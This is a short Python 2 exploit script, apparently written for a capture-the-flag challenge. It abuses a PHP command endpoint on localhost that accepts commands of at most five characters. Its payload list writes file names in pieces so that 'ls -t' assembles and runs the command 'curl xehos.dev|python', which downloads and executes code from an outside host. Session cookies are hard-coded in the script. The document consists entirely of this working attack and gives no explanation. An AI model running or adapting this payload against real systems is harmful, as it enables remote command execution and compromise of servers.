#!/usr/bin/env python2
import requests
from time import sleep
from urllib import quote
from random import random

payload = [
    # ls -t>g
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 

    # curl xehos.dev|python
    '>on', 
    '>th\\', 
    '>py\\', 
    '>\|\\', 
    '>p\\',
    '>ap\\', 
    '>s.\\', 
    '>o\\', 
    '>eh\\', 
    '>x\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\',   

    'sh _', 
    'sh g', 
]

cookies = {
    "session": "107546fc-1fee-424f-9822-b1b272cabfbc",
    "PHPSESSID": "629a4748e774507b50d4c0ac45b8ce35"
}

sandbox = int(random() * 1000)

for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://localhost:5000/dylhot.php?sandboxid={}&cmd={}'.format(sandbox, quote(i)), cookies=cookies)
    print(r.text)
    print i
    sleep(0.2)
